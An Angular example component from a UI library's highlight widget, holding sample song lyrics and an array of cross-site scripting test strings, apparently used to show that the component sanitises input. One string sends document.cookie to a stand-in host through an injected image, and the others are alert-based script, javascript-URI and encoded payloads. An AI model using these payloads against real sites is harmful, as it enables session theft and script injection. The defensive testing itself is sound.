// © 2022 SolarWinds Worldwide, LLC. All rights reserved.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
//  of this software and associated documentation files (the "Software"), to
//  deal in the Software without restriction, including without limitation the
//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
//  sell copies of the Software, and to permit persons to whom the Software is
//  furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
//  all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
//  THE SOFTWARE.

import { Component } from "@angular/core";

@Component({
    selector: "nui-highlight",
    templateUrl: "./highlight.example.component.html",
    standalone: false
})
export class HighlightExampleComponent {
    public contentString = $localize`
        Hello, it's me, I was wondering,<br>
        If after all these years you'd like to meet to go over everything,<br>
        They say that time's supposed to heal, yeah,<br>
        But I ain't done much healing,<br>
        <br>
        Hello, can you hear me?,<br>
        I'm in California dreaming about who we used to be,<br>
        When we were younger and free,<br>
        I've forgotten how it felt before the world fell at our feet,<br>
        <br>
        There's such a difference between us,<br>
        And a million miles,<br>
        <br>
        Hello from the other side,<br>
        I must've called a thousand times ,<br>
        To tell you I'm sorry, for everything that I've done,<br>
        But when I call you never seem to be home,<br>
        <br>
        Hello from the outside,<br>
        At least I can say that I've tried ,<br>
        To tell you I'm sorry, for breaking your heart,<br>
        But it don't matter, it clearly doesn't tear you apart anymore
    `;

    public contentStringIgnore = $localize`
        Hello, can you hear me?,<br>
        I'm in California dreaming about who we used to be,<br>
        When we were younger and free,<br>
        I've forgotten how it felt before the world fell at our feet,
    `;

    public xss = [
        `http://localhost:4200/#/highlight`,
        `><SCRIPT>var+img=new+Image();img.src="http://example.com/"%20+%20document.cookie;</SCRIPT>`,
        `<div>inlinescript<SCRIPT>alert('XSS')</SCRIPT></div>`,
        `<IMG SRC="javascript:alert('XSS');">`,
        `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
        `<a onclick="alert('XSS')" class="someclass">xss anchor</a>`,
    ];

    public search: string;

    constructor() {
        this.search = `c`;
    }
}
